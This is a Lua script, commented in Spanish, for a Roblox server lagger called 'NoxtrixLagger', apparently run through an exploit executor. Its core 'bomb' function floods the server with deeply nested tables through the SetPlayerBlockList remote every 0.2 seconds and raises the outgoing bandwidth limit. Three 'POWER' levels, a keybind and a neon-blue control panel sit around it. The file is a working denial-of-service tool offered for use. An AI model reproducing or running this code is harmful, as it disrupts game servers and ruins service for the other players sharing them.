--// NoxtrixLagger · ESTILO AZUL NEÓN
--// Tecla personalizable · Se guarda automáticamente
--// Solo 3 niveles · Sin Power 4
--// SERVICES
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local player = Players.LocalPlayer
local ConfigFile = "NoxtrixLaggerConfig.json"

-- ⚙️ NIVELES (SIN ULTRA)
local NIVELES = {
    Low     = { poder = 18 },
    Mid     = { poder = 28 },
    High    = { poder = 60 }
}

-- 🔑 TECLA (se guarda)
local keybind = Enum.KeyCode.M
local listeningForInput = false
local laggerActive = false
local lagThread = nil
local nivelActual = "Low"
local ventanaBloqueada = false
local isMinimized = false

-- 🎨 ESTILO — AZUL NEÓN / NEGRO
local UI_CONFIG = {
    MainBg       = Color3.fromRGB(2, 2, 8),
    TitleColor   = Color3.fromRGB(255, 255, 255),
    TextColor    = Color3.fromRGB(180, 220, 255),
    ButtonInact  = Color3.fromRGB(10, 25, 50),
    ButtonLow    = Color3.fromRGB(0, 140, 255),
    ButtonMid    = Color3.fromRGB(0, 180, 255),
    ButtonHigh   = Color3.fromRGB(0, 220, 255),
    ToggleOff    = Color3.fromRGB(15, 35, 70),
    ToggleOn     = Color3.fromRGB(0, 180, 255),
    LockColor    = Color3.fromRGB(150, 210, 255),
    UnlockColor  = Color3.fromRGB(80, 140, 200),
    Font         = Enum.Font.GothamBlack,
    BorderColor  = Color3.fromRGB(0, 160, 255),
    GlowColor    = Color3.fromRGB(0, 200, 255),
    GlowBright   = Color3.fromRGB(80, 230, 255),
    SelectorBg   = Color3.fromRGB(10, 25, 50),
    AccentText   = Color3.fromRGB(100, 210, 255),
}

-- 💾 GUARDAR / CARGAR
local function SaveConfig()
    local data = {
        Keybind = keybind.Name,
        Nivel = nivelActual,
        Bloqueado = ventanaBloqueada
    }
    pcall(function() writefile(ConfigFile, HttpService:JSONEncode(data)) end)
end

local function LoadConfig()
    if pcall(isfile, ConfigFile) and isfile(ConfigFile) then
        pcall(function()
            local data = HttpService:JSONDecode(readfile(ConfigFile))
            if data.Keybind and Enum.KeyCode[data.Keybind] then
                keybind = Enum.KeyCode[data.Keybind]
            end
            nivelActual = data.Nivel or "Low"
            ventanaBloqueada = data.Bloqueado or false
        end)
    end
end
LoadConfig()

-- ⚠️ MOTOR DE LAG
local function bomb(poder)
    local main, spam = {}, {{}}
    local z = spam[1]
    for i = 1, 20 do local t = {} table.insert(z, t) z = t end
    local max = math.min(10000, poder * 50)
    for i = 1, max do table.insert(main, spam) end
    pcall(function() game:GetService("RobloxReplicatedStorage").SetPlayerBlockList:FireServer(main) end)
end

-- 🧩 ELEMENTOS
local toggleBall, toggleContainer, btnLow, btnMid, btnHigh, lockButton
local titleLabel, textLagger, keybindButton, toggleClick, shadowLabel, shadowGradient, powerTip

-- Actualizar botones de nivel
local function actualizarBotonesNivel()
    local niveles = {
        {btn = btnLow, key = "Low"},
        {btn = btnMid, key = "Mid"},
        {btn = btnHigh, key = "High"},
    }
    for _, info in ipairs(niveles) do
        if nivelActual == info.key then
            info.btn.BackgroundColor3 = UI_CONFIG["Button"..info.key]
            info.btn.TextColor3 = Color3.fromRGB(0, 0, 0)
            info.btn.BorderSizePixel = 0
        else
            info.btn.BackgroundColor3 = UI_CONFIG.ButtonInact
            info.btn.TextColor3 = Color3.fromRGB(150, 200, 240)
            info.btn.BorderSizePixel = 1
            info.btn.BorderColor3 = UI_CONFIG.BorderColor
        end
    end
    if powerTip then
        local tips = {
            Low   = "POWER 1 · Estabilidad: Alta",
            Mid   = "POWER 2 · Estabilidad: Media",
            High  = "POWER 3 · Estabilidad: Baja",
        }
        powerTip.Text = tips[nivelActual] or ""
        powerTip.Visible = true
    end
end

local function actualizarSwitch()
    if toggleContainer then
        toggleContainer.BackgroundColor3 = laggerActive and UI_CONFIG.ToggleOn or UI_CONFIG.ToggleOff
    end
    if toggleBall then
        toggleBall.Position = laggerActive and UDim2.new(1, -22, 0.5, -10) or UDim2.new(0, 3, 0.5, -10)
    end
    if toggleClick then
        toggleClick.Text = laggerActive and "ACTIVO" or "INACTIVO"
        toggleClick.TextColor3 = laggerActive and UI_CONFIG.GlowBright or Color3.fromRGB(255, 80, 80)
    end
end

local function actualizarCandado()
    lockButton.Text = ventanaBloqueada and "🔒" or "🔓"
    lockButton.TextColor3 = ventanaBloqueada and UI_CONFIG.LockColor or UI_CONFIG.UnlockColor
end

local function actualizarKeybindButton()
    if keybindButton then
        local display = keybind.Name:gsub("Button", "")
        keybindButton.Text = "TECLA: " .. display
    end
end

local function toggleLagger()
    laggerActive = not laggerActive
    local targetPos = laggerActive and UDim2.new(1, -22, 0.5, -10) or UDim2.new(0, 3, 0.5, -10)
    TweenService:Create(toggleBall, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {Position = targetPos}):Play()
    toggleClick.Text = laggerActive and "ACTIVO" or "INACTIVO"
    toggleClick.TextColor3 = laggerActive and UI_CONFIG.GlowBright or Color3.fromRGB(255, 80, 80)
    
    if laggerActive then
        if lagThread then task.cancel(lagThread) end
        lagThread = task.spawn(function()
            while laggerActive do
                pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(70000) end)
                bomb(NIVELES[nivelActual].poder)
                task.wait(0.2)
            end
        end)
    else
        if lagThread then task.cancel(lagThread); lagThread = nil end
    end
end

-- 🖼️ INTERFAZ
if CoreGui:FindFirstChild("NoxtrixLagger_UI") then CoreGui.NoxtrixLagger_UI:Destroy() end
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "NoxtrixLagger_UI"
screenGui.Parent = CoreGui
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.ResetOnSpawn = false

-- Panel principal
local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.BackgroundColor3 = UI_CONFIG.MainBg
mainFrame.BorderSizePixel = 2
mainFrame.BorderColor3 = UI_CONFIG.BorderColor
mainFrame.Size = UDim2.new(0, 260, 0, 115)
mainFrame.Position = UDim2.new(0.08, 0, 0.45, -57)
mainFrame.Parent = screenGui
Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 8)

-- GRADIENTE AZUL NEÓN
local gradient = Instance.new("UIGradient", mainFrame)
gradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 10, 30)),
    ColorSequenceKeypoint.new(0.4, Color3.fromRGB(0, 30, 70)),
    ColorSequenceKeypoint.new(0.7, Color3.fromRGB(0, 60, 120)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 120, 200))
})
gradient.Rotation = 90

-- ⭐ DESTELLOS AZULES BRILLANTES
local stars = {}
for i = 1, 30 do
    local star = Instance.new("Frame", mainFrame)
    star.BackgroundColor3 = i % 5 == 0 and UI_CONFIG.GlowBright or UI_CONFIG.GlowColor
    star.Size = UDim2.new(0, 1+math.random()*2, 0, 1+math.random()*2)
    star.Position = UDim2.new(math.random(),0,math.random(),0)
    star.BackgroundTransparency = 0.2+math.random()*0.5
    Instance.new("UICorner", star).CornerRadius = UDim.new(1,0)
    table.insert(stars, {frame=star, timer=1.5+math.random()*2, elapsed=0})
end
task.spawn(function()
    while true do
        for _,s in ipairs(stars) do
            s.elapsed += 0.1
            if s.elapsed >= s.timer then
                s.elapsed = 0
                TweenService:Create(s.frame, TweenInfo.new(0.4), {BackgroundTransparency=1}):Play()
                task.wait(0.15)
                s.frame.Position = UDim2.new(math.random(),0,math.random(),0)
                TweenService:Create(s.frame, TweenInfo.new(0.4), {BackgroundTransparency=0.4}):Play()
            end
        end
        task.wait(0.1)
    end
end)

-- TÍTULO
titleLabel = Instance.new("TextLabel", mainFrame)
titleLabel.BackgroundTransparency = 1
titleLabel.Position = UDim2.new(0, 10, 0, 3)
titleLabel.Size = UDim2.new(0, 200, 0, 26)
titleLabel.Font = UI_CONFIG.Font
titleLabel.Text = "NoxtrixLagger"
titleLabel.TextColor3 = UI_CONFIG.GlowColor
titleLabel.TextSize = 17
titleLabel.TextXAlignment = Enum.TextXAlignment.Left

shadowLabel = Instance.new("TextLabel", mainFrame)
shadowLabel.BackgroundTransparency = 1
shadowLabel.Position = titleLabel.Position
shadowLabel.Size = titleLabel.Size
shadowLabel.Font = titleLabel.Font
shadowLabel.Text = titleLabel.Text
shadowLabel.TextSize = titleLabel.TextSize
shadowLabel.TextXAlignment = titleLabel.TextXAlignment
shadowLabel.TextTransparency = 0.5
shadowLabel.TextColor3 = Color3.fromRGB(100, 180, 255)
shadowGradient = Instance.new("UIGradient", shadowLabel)
shadowGradient.Color = ColorSequence.new(Color3.fromRGB(0,100,200), Color3.fromRGB(80,220,255))
task.spawn(function() while true do for i=0,1,0.005 do shadowGradient.Offset=Vector2.new(i,0) task.wait(0.03) end end end)

textLagger = Instance.new("TextLabel", mainFrame)
textLagger.BackgroundTransparency = 1
textLagger.Position = UDim2.new(0, 10, 0, 34)
textLagger.Size = UDim2.new(0, 100, 0, 20)
textLagger.Font = UI_CONFIG.Font
textLagger.Text = "CONTROL"
textLagger.TextColor3 = UI_CONFIG.TextColor
textLagger.TextSize = 13
textLagger.TextXAlignment = Enum.TextXAlignment.Left

powerTip = Instance.new("TextLabel", mainFrame)
powerTip.BackgroundTransparency = 1
powerTip.Position = UDim2.new(0, 10, 0, 55)
powerTip.Size = UDim2.new(0, 240, 0, 11)
powerTip.Font = Enum.Font.GothamBold
powerTip.Text = "POWER 1 · Estabilidad: Alta"
powerTip.TextColor3 = UI_CONFIG.AccentText
powerTip.TextSize = 9
powerTip.TextXAlignment = Enum.TextXAlignment.Left

-- BOTONES TECLA / BLOQUEO
keybindButton = Instance.new("TextButton", mainFrame)
keybindButton.BackgroundColor3 = UI_CONFIG.SelectorBg
keybindButton.Position = UDim2.new(1, -158, 0, 5)
keybindButton.Size = UDim2.new(0, 52, 0, 18)
keybindButton.Font = Enum.Font.GothamBold
keybindButton.Text = "TECLA: M"
keybindButton.TextColor3 = UI_CONFIG.TextColor
keybindButton.TextSize = 9
keybindButton.AutoButtonColor = false
Instance.new("UICorner", keybindButton).CornerRadius = UDim.new(0, 5)

lockButton = Instance.new("TextButton", mainFrame)
lockButton.BackgroundColor3 = UI_CONFIG.SelectorBg
lockButton.Position = UDim2.new(1, -100, 0, 5)
lockButton.Size = UDim2.new(0, 36, 0, 18)
lockButton.Font = Enum.Font.GothamBold
lockButton.Text = "🔓"
lockButton.TextColor3 = UI_CONFIG.UnlockColor
lockButton.TextSize = 11
lockButton.AutoButtonColor = false
Instance.new("UICorner", lockButton).CornerRadius = UDim.new(0, 5)
lockButton.MouseButton1Click:Connect(function()
    ventanaBloqueada = not ventanaBloqueada
    actualizarCandado()
    SaveConfig()
end)

-- MINIMIZAR / MAXIMIZAR
local FULL_SIZE = UDim2.new(0, 260, 0, 115)
local MIN_SIZE  = UDim2.new(0, 220, 0, 68)
local minimizeBtn = Instance.new("TextButton", mainFrame)
minimizeBtn.BackgroundColor3 = UI_CONFIG.SelectorBg
minimizeBtn.Position = UDim2.new(1, -48, 0, 5)
minimizeBtn.Size = UDim2.new(0, 20, 0, 18)
minimizeBtn.Font = Enum.Font.GothamBold
minimizeBtn.Text = "−"
minimizeBtn.TextColor3 = UI_CONFIG.GlowColor
minimizeBtn.TextSize = 14
minimizeBtn.AutoButtonColor = false
Instance.new("UICorner", minimizeBtn).CornerRadius = UDim.new(0, 5)

local maximizeBtn = Instance.new("TextButton", mainFrame)
maximizeBtn.BackgroundColor3 = UI_CONFIG.SelectorBg
maximizeBtn.Position = UDim2.new(1, -26, 0, 5)
maximizeBtn.Size = UDim2.new(0, 20, 0, 18)
maximizeBtn.Font = Enum.Font.GothamBold
maximizeBtn.Text = "□"
maximizeBtn.TextColor3 = UI_CONFIG.GlowColor
maximizeBtn.TextSize = 11
maximizeBtn.AutoButtonColor = false
Instance.new("UICorner", maximizeBtn).CornerRadius = UDim.new(0, 5)

local function setMinimized(state)
    isMinimized = state
    if state then
        TweenService:Create(mainFrame, TweenInfo.new(0.25), {Size = MIN_SIZE}):Play()
        if textLagger then textLagger.Visible = false end
        if btnLow then btnLow.Visible = false end
        if btnMid then btnMid.Visible = false end
        if btnHigh then btnHigh.Visible = false end
        if powerTip then powerTip.Visible = false end
        if keybindButton then keybindButton.Visible = false end
        if lockButton then lockButton.Visible = false end
        if titleLabel then titleLabel.Position = UDim2.new(0,10,0,4); titleLabel.Size=UDim2.new(0,170,0,24); titleLabel.TextSize=16 end
        if shadowLabel then shadowLabel.Position=titleLabel.Position; shadowLabel.Size=titleLabel.Size; shadowLabel.TextSize=16 end
        if toggleContainer then toggleContainer.Visible=true; toggleContainer.Position=UDim2.new(0.5,-70,0,34); toggleContainer.Size=UDim2.new(0,140,0,30) end
        if toggleClick then toggleClick.TextSize=12 end
        if toggleBall then toggleBall.Size=UDim2.new(0,24,0,24) end
        minimizeBtn.Text = "+"
    else
        TweenService:Create(mainFrame, TweenInfo.new(0.25), {Size = FULL_SIZE}):Play()
        if textLagger then textLagger.Visible = true end
        if btnLow then btnLow.Visible = true end
        if btnMid then btnMid.Visible = true end
        if btnHigh then btnHigh.Visible = true end
        if powerTip then powerTip.Visible = true end
        if keybindButton then keybindButton.Visible = true end
        if lockButton then lockButton.Visible = true end
        if titleLabel then titleLabel.Position=UDim2.new(0,10,0,3); titleLabel.Size=UDim2.new(0,200,0,26); titleLabel.TextSize=17 end
        if shadowLabel then shadowLabel.Position=titleLabel.Position; shadowLabel.Size=titleLabel.Size; shadowLabel.TextSize=17 end
        if toggleContainer then toggleContainer.Position=UDim2.new(1,-110,0,36); toggleContainer.Size=UDim2.new(0,96,0,26) end
        if toggleClick then toggleClick.TextSize=9 end
        if toggleBall then toggleBall.Size=UDim2.new(0,20,0,20) end
        minimizeBtn.Text = "−"
    end
end
minimizeBtn.MouseButton1Click:Connect(function() setMinimized(not isMinimized) end)
maximizeBtn.MouseButton1Click:Connect(function() setMinimized(false) end)

-- SWITCH ACTIVACIÓN
toggleContainer = Instance.new("Frame", mainFrame)
toggleContainer.BackgroundColor3 = UI_CONFIG.ToggleOff
toggleContainer.Position = UDim2.new(1, -110, 0, 36)
toggleContainer.Size = UDim2.new(0, 96, 0, 26)
Instance.new("UICorner", toggleContainer).CornerRadius = UDim.new(1,0)

toggleBall = Instance.new("Frame", toggleContainer)
toggleBall.BackgroundColor3 = UI_CONFIG.GlowColor
toggleBall.Size = UDim2.new(0, 20, 0, 20)
toggleBall.Position = UDim2.new(0, 3, 0.5, -10)
Instance.new("UICorner", toggleBall).CornerRadius = UDim.new(1,0)

toggleClick = Instance.new("TextButton", toggleContainer)
toggleClick.BackgroundTransparency = 1
toggleClick.Size = UDim2.new(1,0,1,0)
toggleClick.ZIndex = 3
toggleClick.Font = Enum.Font.GothamBold
toggleClick.Text = "INACTIVO"
toggleClick.TextSize = 9
toggleClick.TextColor3 = Color3.fromRGB(255, 80, 80)
toggleClick.MouseButton1Click:Connect(toggleLagger)
toggleClick.AutoButtonColor = false

-- SELECTOR DE TECLA
keybindButton.MouseButton1Click:Connect(function()
    if listeningForInput then return end
    listeningForInput = true
    keybindButton.Text = "TECLA: ..."
    keybindButton.BackgroundColor3 = UI_CONFIG.GlowColor
    keybindButton.TextColor3 = Color3.new(1,1,1)
end)
UserInputService.InputBegan:Connect(function(input, gp)
    if not listeningForInput or gp then return end
    if input.KeyCode ~= Enum.KeyCode.Unknown then
        keybind = input.KeyCode
        actualizarKeybindButton()
        listeningForInput = false
        keybindButton.BackgroundColor3 = UI_CONFIG.SelectorBg
        keybindButton.TextColor3 = UI_CONFIG.TextColor
        SaveConfig()
    end
end)

-- BOTONES DE NIVEL
local btnY = 82
local btnW = 72
local btnH = 26
local espaciado = 6
local margenIzq = 12

btnLow = Instance.new("TextButton", mainFrame)
btnLow.Size = UDim2.new(0, btnW, 0, btnH)
btnLow.Position = UDim2.new(0, margenIzq, 0, btnY)
btnLow.Font = UI_CONFIG.Font
btnLow.Text = "POWER 1"
btnLow.TextColor3 = Color3.fromRGB(200, 210, 230)
btnLow.TextSize = 10
btnLow.AutoButtonColor = false
btnLow.BackgroundColor3 = UI_CONFIG.ButtonInact
btnLow.BorderSizePixel = 1
btnLow.BorderColor3 = UI_CONFIG.BorderColor
Instance.new("UICorner", btnLow).CornerRadius = UDim.new(0, 6)
btnLow.MouseButton1Click:Connect(function() nivelActual = "Low"; actualizarBotonesNivel(); SaveConfig() end)

btnMid = Instance.new("TextButton", mainFrame)
btnMid.Size = UDim2.new(0, btnW, 0, btnH)
btnMid.Position = UDim2.new(0, margenIzq + btnW + espaciado, 0, btnY)
btnMid.Font = UI_CONFIG.Font
btnMid.Text = "POWER 2"
btnMid.TextColor3 = Color3.fromRGB(200, 210, 230)
btnMid.TextSize = 10
btnMid.AutoButtonColor = false
btnMid.BackgroundColor3 = UI_CONFIG.ButtonInact
btnMid.BorderSizePixel = 1
btnMid.BorderColor3 = UI_CONFIG.BorderColor
Instance.new("UICorner", btnMid).CornerRadius = UDim.new(0, 6)
btnMid.MouseButton1Click:Connect(function() nivelActual = "Mid"; actualizarBotonesNivel(); SaveConfig() end)

btnHigh = Instance.new("TextButton", mainFrame)
btnHigh.Size = UDim2.new(0, btnW, 0, btnH)
btnHigh.Position = UDim2.new(0, margenIzq + (btnW + espaciado) * 2, 0, btnY)
btnHigh.Font = UI_CONFIG.Font
btnHigh.Text = "POWER 3"
btnHigh.TextColor3 = Color3.fromRGB(200, 210, 230)
btnHigh.TextSize = 10
btnHigh.AutoButtonColor = false
btnHigh.BackgroundColor3 = UI_CONFIG.ButtonInact
btnHigh.BorderSizePixel = 1
btnHigh.BorderColor3 = UI_CONFIG.BorderColor
Instance.new("UICorner", btnHigh).CornerRadius = UDim.new(0, 6)
btnHigh.MouseButton1Click:Connect(function() nivelActual = "High"; actualizarBotonesNivel(); SaveConfig() end)

-- INICIALIZAR
actualizarBotonesNivel()
actualizarSwitch()
actualizarCandado()
actualizarKeybindButton()

-- ARRASTRAR VENTANA
local isDragging, dragStart, startPos = false, nil, nil
mainFrame.InputBegan:Connect(function(input)
    if ventanaBloqueada then return end
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        isDragging = true
        dragStart = input.Position
        startPos = mainFrame.Position
    end
end)
UserInputService.InputChanged:Connect(function(input)
    if not isDragging or ventanaBloqueada then return end
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        local delta = input.Position - dragStart
        mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)
mainFrame.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        isDragging = false
    end
end)

-- 🎮 ACTIVACIÓN CON TECLA
UserInputService.InputBegan:Connect(function(input, gp)
    if gp then return end
    if input.KeyCode == keybind then
        toggleLagger()
    end
end)